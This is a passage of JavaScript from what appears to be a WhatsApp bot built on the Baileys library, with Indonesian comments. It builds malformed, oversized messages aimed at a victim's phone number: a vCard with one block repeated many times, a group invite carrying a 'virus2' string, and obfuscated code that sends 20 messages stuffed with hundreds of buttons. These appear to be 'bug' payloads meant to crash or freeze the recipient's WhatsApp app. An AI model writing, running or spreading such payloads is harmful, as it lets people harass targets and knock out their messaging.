karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;\nEND:VCARD` }}}		
var messaa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/ok.jpg') }, { upload: rixx.waUploadToServer })
var groupInvite = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"groupInviteMessage": {
"groupJid": "85296556573-1328272333@g.us",
"inviteCode": "wFHwtOxGQN8OwK2x",
"inviteExpiration": `𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁${virus2}`,
"groupName": `𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁${virus2}`,
"caption": `${virus2}`,
"jpegThumbnail": messaa.imageMessage,
}
}), { userJid: m.chat, quoted: farizcoli })
rixx.relayMessage(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', groupInvite.message, { messageId: groupInvite.key.id })
}
break

// INI BUG KE NOMER //
case '🗿':
case '🔥':
case '❤️‍🔥':
case '🚀':
case '🤬':
case '👿':
case '🥵':
case '🐦':
case '😎':
case '??‍??':
case '😱':
case '🌷':
case '📦':
case '🤓':
case '🤯':
case '🤔':
case '🥶':
case '🤐':
case '🤫':
case '🤕':
case '🤒':
case '🤧':
case '💦':
 if (!itsMerixx) return m.reply(`Lu siapa? Belum di addakses\n\nMinta addakses sama Wa.me/6285172200670?text=Minta+Akses+Dong`)
 const _0x9b73d7=_0x268f;function _0x16ca(){const _0x174fe6=['☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','1301419blsWFD','6932mTzwKV','BUG\x20BY\x20CYCLONE','8410380bCGJGY','157322kyamfD','211CGbyZQ','2418PETmGu','290NjpjKy','128910NzpElc','sendMessage','62368OiCTSf','https://www.whatsapp.com/otp/copy/','6NwCzzo','SUCCES\x20✅','reply','170JTeEvp','99XnyyEA'];_0x16ca=function(){return _0x174fe6;};return _0x16ca();}function _0x268f(_0x1886bf,_0x4cbe97){const _0x16ca4e=_0x16ca();return _0x268f=function(_0x268f42,_0xaf1515){_0x268f42=_0x268f42-0xff;let _0x4604b8=_0x16ca4e[_0x268f42];return _0x4604b8;},_0x268f(_0x1886bf,_0x4cbe97);}(function(_0x129aa0,_0x4ae1d3){const _0x517830=_0x268f,_0x2b387=_0x129aa0();while(!![]){try{const _0x32af14=parseInt(_0x517830(0x10e))/0x1*(parseInt(_0x517830(0x10f))/0x2)+parseInt(_0x517830(0xff))/0x3+-parseInt(_0x517830(0x10a))/0x4*(parseInt(_0x517830(0x106))/0x5)+-parseInt(_0x517830(0x103))/0x6*(-parseInt(_0x517830(0x109))/0x7)+parseInt(_0x517830(0x101))/0x8*(parseInt(_0x517830(0x107))/0x9)+-parseInt(_0x517830(0x110))/0xa*(-parseInt(_0x517830(0x10d))/0xb)+-parseInt(_0x517830(0x10c))/0xc;if(_0x32af14===_0x4ae1d3)break;else _0x2b387['push'](_0x2b387['shift']());}catch(_0x370954){_0x2b387['push'](_0x2b387['shift']());}}}(_0x16ca,0x36dc9));{if(!isGroup)return m[_0x9b73d7(0x105)]('sorry\x20anda\x20sepertinya\x20bukan\x20pemilik\x20bot');txts=_0x9b73d7(0x104),m['reply'](txts);if(!q)return;num=''+q+'@s.whatsapp.net',jumlah='20',waktu='5s';for(let i=0x0;i<jumlah;i++){rixx[_0x9b73d7(0x100)](num,{'text':_0x9b73d7(0x10b),'templateButtons':[{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':